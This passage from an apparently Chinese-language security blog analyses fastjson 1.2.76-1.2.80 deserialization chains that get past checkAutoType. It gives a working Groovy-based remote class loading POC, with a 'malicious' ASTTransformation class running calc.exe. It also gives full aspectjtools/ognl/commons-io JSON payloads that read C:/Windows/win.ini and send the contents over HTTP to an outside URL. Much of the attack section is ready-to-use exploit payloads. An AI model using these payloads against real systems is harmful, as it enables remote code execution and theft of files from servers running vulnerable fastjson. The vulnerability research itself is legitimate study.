class="line">        <span class="attr">&quot;classpathList&quot;</span><span class="punctuation">:</span><span class="string">&quot;http://127.0.0.1:8080/&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>之前说过为Exception的子类可以绕过checkAutoType()，然后调用createException()创建实例</p>
<p>ThrowableDeserializer.deserialize()</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221118161.png" alt="image-20230322111828506"></p>
<p>绕过checkAutoType()，并设置exClass为CompilationFailedException</p>
<p>但是重点在CompilationFailedException的unit属性中，在第二次扫描符号时，扫描到unit属性</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221119521.png" alt="image-20230322111948411"></p>
<p>然后将key和parser.parser()放进otherValues，key为unit，parser.parse()解析JSON字符串的unit属性的值，指定为空，所以这里为空</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221126513.png" alt="image-20230322112649395"></p>
<p>但是由于CompilationFailedException的构造函数不符合条件，所以无法创建实例，ex为null，只能创建Exception()实例并赋值给ex</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221125853.png" alt="image-20230322112503788"></p>
<p>otherValues不为null，获取unit属性的deserializer，判断unit的Class不是value的实例的话，调用TypeUtils.cast()方法，然后传递unit属性的类型，unit属性为ProcessingUnit类</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221135677.png" alt="image-20230322113511151"></p>
<p>cast又调用cast，套娃</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221137166.png" alt="image-20230322113721056"></p>
<p>cast方法里又调用castToJavaBean</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221139310.png" alt="image-20230322113918222"></p>
<p>在castToJavaBean方法里，调用getDeserializer获取ProcessingUnit类的deserializer</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221152278.png" alt="image-20230322115224174"></p>
<p>然后调用getDeserializer的重载，套娃</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221153898.png" alt="image-20230322115330816"></p>
<p>然后在getDeserializer方法的重载里，创建了ProcessingUnit类型的deserializer，然后调用putDeserializer</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221156689.png" alt="image-20230322115629571"></p>
<p>在putDeserializer方法里，将ProcessingUnit类型的deserializer放进了ParserConfig的deserializers属性中，这是后面绕过checkAutoType()的关键</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221158316.png" alt="image-20230322115824231"></p>
<p>然后一路返回deserializer</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221140884.png" alt="image-20230322114023809"></p>
<p>不符合条件创建实例失败，返回null</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221145156.png" alt="image-20230322114548055"></p>
<p>然后setValue</p>
<p>第一次POC触发，将ProcessingUnit类型的deserializer放进了ParserConfig的deserializers中</p>
<p>在第二次POC触发中，</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221204946.png" alt="image-20230322120442836"></p>
<p>检测@type属性的类时，调用checkAutoType方法</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221205302.png" alt="image-20230322120548182"></p>
<p>由于已将ProcessingUnit类的deserializer放进了缓存中，所以这里可以找到clazz，绕过了checkAutoType的限制</p>
<p>同时第二次使用了JavaBeanDeserializer那条链，在对JavaStubCompilationUnit进行checkAutoType时，因为传入了expectClass，所以过了checkAutoType的检测</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221218235.png" alt="image-20230322121845124"></p>
<p>后面创建JavaStubCompilationUnit类的deserializer，然后它的调用deserialze方法，后面反射调用JavaStubCompilationUnit类的构造器创建实例</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221227735.png" alt="image-20230322122721627"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221227519.png" alt="image-20230322122734434"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221227801.png" alt="image-20230322122751696"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221228290.png" alt="image-20230322122812217"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221228483.png" alt="image-20230322122827383"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221228025.png" alt="image-20230322122838953"></p>
<p>将JSON字符串中classpathList属性的值（<code>http://127.0.0.1:8080/</code>）添加到classpath</p>
<p>继承关系：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221231797.png" alt="image-20230322123120735"></p>
<p>在CompilationUnit的构造函数中super调用完后，会调用ASTTransformationVisitor.addPhaseOperations(this)</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221232974.png" alt="image-20230322123233874"></p>
<p>然后调用addGlobalTransforms</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221233628.png" alt="image-20230322123348521"></p>
<p>然后调用doAddGlobalTransforms</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221234910.png" alt="image-20230322123435827"></p>
<p>获取META-INF&#x2F;services&#x2F;org.codehaus.groovy.transform.ASTTransformation文件中的内容，META-INF&#x2F;services&#x2F;org.codehaus.groovy.transform.ASTTransformation该文件的内容就是我们要执行的恶意类的类名</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221235781.png" alt="image-20230322123526645"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221236489.png" alt="image-20230322123654395"></p>
<p>然后调用addPhaseOperationsForGlobalTransforms()，transformNames中存储了我们的恶意类</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221237487.png" alt="image-20230322123748383"></p>
<p>在addPhaseOperationsForGlobalTransforms方法中，进行加载类，并实例化我们的恶意类，这个恶意类要为ASTTransformation的子类</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221239007.png" alt="image-20230322123918890"></p>
<p>我的恶意类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.groovy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.ast.ASTNode;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.control.CompilePhase;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.control.SourceUnit;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.transform.ASTTransformation;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.transform.GroovyASTTransformation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@GroovyASTTransformation(phase= CompilePhase.CONVERSION)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AK</span> <span class="keyword">implements</span> <span class="title class_">ASTTransformation</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AK</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(ASTNode[] astNodes, SourceUnit sourceUnit)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>第一次使用ThrowableDeserializer那条链，将Exception作为expectClass绕过checkAutoType，成功加载CompilationFailedException，然后在获取属性unit（ProcessingUnit类）的deserializer放入缓存</p>
<p>第二次使用JavaBeanDeserializer那条链，由于ProcessingUnit的deserializer已放入缓存，所以绕过了checkAutoType，然后调用JavaStubCompilationUnit的构造函数触发后续操作</p>
<p>而最最关键的TypeUtils.cast(value, fieldInfo.fieldType, parser.getConfig())方法是用来将deserializer放入缓存的，没有它就不会有第二步操作</p>
<p>而一开始说的为啥1.2.76以下不适用呢？因为在1.2.76版本下没有cast调用</p>
<p>这是1.2.76版本下的：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221247402.png" alt="image-20230322124759296"></p>
<p>对比1.2.76~80：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303221249955.png" alt="image-20230322124927846"></p>
<h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><h4 id="使用aspectJ库"><a href="#使用aspectJ库" class="headerlink" title="使用aspectJ库"></a>使用aspectJ库</h4><p>利用aspectJ进行文件读取，一种是错误回显，另一种是dnslog（不成功）</p>
<p>虽然只依赖一个库，但是会由于各种限制，并不会直接将错误结果返回到前台</p>
<p>所以这个略过</p>
<h4 id="使用aspectjtools库、ognl库以及commons-io库"><a href="#使用aspectjtools库、ognl库以及commons-io库" class="headerlink" title="使用aspectjtools库、ognl库以及commons-io库"></a>使用aspectjtools库、ognl库以及commons-io库</h4><p>依赖三个jar包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.aspectj&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.9.5&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;ognl&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;ognl&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;3.2.21&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;2.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>这个将文件读取的结果进行http外带</p>
<p>poc1：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Exception&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;</span></span><br><span class="line">	<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.String&quot;</span> <span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.util.Locale&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="punctuation">&#123;</span></span><br><span class="line">						<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.String&quot;</span></span><br><span class="line">						<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="attr">&quot;newAnnotationProcessorUnits&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">					<span class="punctuation">&#125;</span></span><br><span class="line">				<span class="punctuation">&#125;</span></span><br><span class="line">			<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;x&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;fileName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aaa&quot;</span></span><br><span class="line">				<span class="punctuation">&#125;</span></span><br><span class="line">			<span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>

<p>poc2:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;su14&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Exception&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ognl.OgnlException&quot;</span></span><br><span class="line">	<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;su15&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.String&quot;</span></span><br><span class="line">				<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ognl.OgnlException&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;_evaluation&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">			<span class="punctuation">&#125;</span></span><br><span class="line">		<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;su16&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ognl.Evaluation&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;node&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ognl.ASTMethod&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ognl.OgnlParser&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;stream&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">						<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="attr">&quot;delegate&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">								<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">								<span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">									<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.String&quot;</span> <span class="punctuation">&#123;</span></span><br><span class="line">										<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.util.Locale&quot;</span><span class="punctuation">,</span></span><br><span class="line">										<span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">											<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">											<span class="punctuation">&#123;</span></span><br><span class="line">												<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.String&quot;</span></span><br><span class="line">												<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.util.Locale&quot;</span><span class="punctuation">,</span></span><br><span class="line">												<span class="attr">&quot;language&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://127.0.0.1:8080/?test&quot;</span><span class="punctuation">,</span></span><br><span class="line">												<span class="attr">&quot;country&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">													<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.String&quot;</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">														<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;</span><span class="punctuation">,</span></span><br><span class="line">														<span class="attr">&quot;fileName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C:/Windows/win.ini&quot;</span></span><br><span class="line">													<span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line"></span><br><span class="line">												<span class="punctuation">&#125;</span></span><br><span class="line">											<span class="punctuation">&#125;</span></span><br><span class="line">										<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">										<span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">										<span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span></span><br><span class="line">									<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">									<span class="attr">&quot;boms&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">										<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span><span class="punctuation">,</span></span><br><span class="line">										<span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">										<span class="attr">&quot;bytes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">											<span class="number">36</span></span><br><span class="line">										<span class="punctuation">]</span></span><br><span class="line">									<span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">								<span class="punctuation">&#125;</span></span><br><span class="line">							<span class="punctuation">&#125;</span></span><br><span class="line">						<span class="punctuation">&#125;</span></span><br><span class="line">					<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;su17&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">						<span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.su16.node.p.stream&quot;</span></span><br><span class="line">					<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;su18&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">						<span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.su17.bOM.bytes&quot;</span></span><br><span class="line">					<span class="punctuation">&#125;</span></span><br><span class="line">				<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>一步步来看，首先是这个：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#123;</span><br><span class="line">		&quot;@type&quot;: &quot;java.lang.Exception&quot;,</span><br><span class="line">		&quot;@type&quot;: &quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>利用expectClass绕过checkAutoType检测，并将SourceTypeCollisionException类进行缓存，以便绕过对SourceTypeCollisionException类的checkAutoType的检测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">		&quot;@type&quot;: &quot;java.lang.Class&quot;,</span><br><span class="line">		&quot;val&quot;: &#123;</span><br><span class="line">			&quot;@type&quot;: &quot;java.lang.String&quot; &#123;</span><br><span class="line">				&quot;@type&quot;: &quot;java.util.Locale&quot;,</span><br><span class="line">				&quot;val&quot;: &#123;</span><br><span class="line">					&quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">					&#123;</span><br><span class="line">						&quot;@type&quot;: &quot;java.lang.String&quot;</span><br><span class="line">						&quot;@type&quot;: &quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;,</span><br><span class="line">						&quot;newAnnotationProcessorUnits&quot;: [&#123;&#125;]</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;,</span><br></pre></td></tr></table></figure>

<p>这一步会调用ParserConfig.getDeserializer为newAnnotationProcessorUnits所在的类ICompilationUnit创建deserializer并放入缓存，以便绕过对ICompilationUnit类的checkAutoType的检测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">				&quot;x&quot;: &#123;</span><br><span class="line">					&quot;@type&quot;: &quot;org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit&quot;,</span><br><span class="line">					&quot;@type&quot;: &quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;,</span><br><span class="line">					&quot;fileName&quot;: &quot;aaa&quot;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;]</span><br></pre></td></tr></table></figure>

<p>这里同样利用expectClass绕过checkAutoType并将BasicCompilationUnit类进行缓存，以便绕过对BasicCompilationUnit类的checkAutoType的检测</p>
<p>然后是poc2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;su14&quot;: &#123;</span><br><span class="line">		&quot;@type&quot;: &quot;java.lang.Exception&quot;,</span><br><span class="line">		&quot;@type&quot;: &quot;ognl.OgnlException&quot;</span><br><span class="line">	&#125;,</span><br></pre></td></tr></table></figure>

<p>对OgnlException进行缓存，以便绕过对OgnlException类的checkAutoType的检测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;su15&quot;: &#123;</span><br><span class="line">		&quot;@type&quot;: &quot;java.lang.Class&quot;,</span><br><span class="line">		&quot;val&quot;: &#123;</span><br><span class="line">			&quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">			&#123;</span><br><span class="line">				&quot;@type&quot;: &quot;java.lang.String&quot;</span><br><span class="line">				&quot;@type&quot;: &quot;ognl.OgnlException&quot;,</span><br><span class="line">				&quot;_evaluation&quot;: &quot;&quot;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;,</span><br></pre></td></tr></table></figure>

<p>这一步会调用ParserConfig.getDeserializer为_evaluation所在的类Evaluation创建deserializer并放入缓存，以便绕过对Evaluation类的checkAutoType的检测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;su16&quot;: &#123;</span><br><span class="line">			&quot;@type&quot;: &quot;ognl.Evaluation&quot;,</span><br><span class="line">			&quot;node&quot;: &#123;</span><br><span class="line">				&quot;@type&quot;: &quot;ognl.ASTMethod&quot;,</span><br><span class="line">				&quot;p&quot;: &#123;</span><br><span class="line">					&quot;@type&quot;: &quot;ognl.OgnlParser&quot;,</span><br></pre></td></tr></table></figure>

<p>调用Evaluation类的构造函数，传入node参数</p>
<p>node为ASTMethod类，调用ASTMethod类的构造函数，传入p参数，p为OgnlParser类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;stream&quot;: &#123;</span><br><span class="line">						&quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,</span><br><span class="line">						&quot;delegate&quot;: &#123;</span><br><span class="line">                                &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,</span><br><span class="line">                                .....</span><br><span class="line">                        &quot;boms&quot;: [&#123;</span><br><span class="line">										&quot;@type&quot;: &quot;org.apache.commons.io.ByteOrderMark&quot;,</span><br><span class="line">										&quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">										&quot;bytes&quot;: [</span><br><span class="line">											36</span><br><span class="line">										]</span><br><span class="line">									&#125;]</span><br></pre></td></tr></table></figure>

<p>再调用OgnlParser类的构造函数，传递stream参数</p>
<p>stream为BOMInputStream类，再调用BOMInputStream类的构造函数，传递delegate、boms参数</p>
<p>再调用ReaderInputStream类的构造函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;reader&quot;: &#123;</span><br><span class="line">								&quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;,</span><br><span class="line">								&quot;url&quot;: &#123;</span><br><span class="line">									&quot;@type&quot;: &quot;java.lang.String&quot; &#123;</span><br><span class="line">										&quot;@type&quot;: &quot;java.util.Locale&quot;,</span><br><span class="line">										&quot;val&quot;: &#123;</span><br><span class="line">		...</span><br><span class="line">&quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">&quot;bufferSize&quot;: 1024</span><br></pre></td></tr></table></figure>

<p>传递reader、charsetName、bufferSize参数，reader为URLReader类，调用URLReader类的构造函数，传递url参数，url为String类型</p>
<p>一些细节需要注意：</p>
<p><code>&quot;@type&quot;: &quot;java.lang.String&quot; &#123;</code>会调用parse解析后面整个对象，然后调用toString()返回</p>
<p><code>&quot;@type&quot;: &quot;java.lang.String&quot; [</code>和{的一样</p>
<p><code>&quot;@type&quot;: &quot;java.lang.String&quot; &quot;</code>会直接返回后面第一个双引号引起来的字符串，然后交给其他类进行解析</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303231855297.png" alt="image-20230323185208197"></p>
<p>回到这里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;reader&quot;: &#123;</span><br><span class="line">								&quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;,</span><br><span class="line">								&quot;url&quot;: &#123;</span><br><span class="line">									&quot;@type&quot;: &quot;java.lang.String&quot; &#123;</span><br><span class="line">										&quot;@type&quot;: &quot;java.util.Locale&quot;,</span><br><span class="line">										&quot;val&quot;: &#123;</span><br></pre></td></tr></table></figure>

<p>他会把后面当成对象解析</p>
<p>获取Locale的deserializer(MiscCodec)，然后调用deserializer的deserialize方法</p>
<p>val为JSONObject类，将val作为对象解析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">											&#123;</span><br><span class="line">												&quot;@type&quot;: &quot;java.lang.String&quot;</span><br><span class="line">												&quot;@type&quot;: &quot;java.util.Locale&quot;,</span><br><span class="line">												&quot;language&quot;: &quot;http://127.0.0.1:8080/?test&quot;,</span><br><span class="line">												&quot;country&quot;: &#123;</span><br><span class="line">													&quot;@type&quot;: &quot;java.lang.String&quot; [&#123;</span><br><span class="line">														&quot;@type&quot;: &quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;,</span><br><span class="line">														&quot;fileName&quot;: &quot;C:/Windows/win.ini&quot;</span><br><span class="line">													&#125;]</span><br><span class="line"></span><br><span class="line">												&#125;</span><br><span class="line">											&#125;</span><br><span class="line">										&#125;,</span><br></pre></td></tr></table></figure>

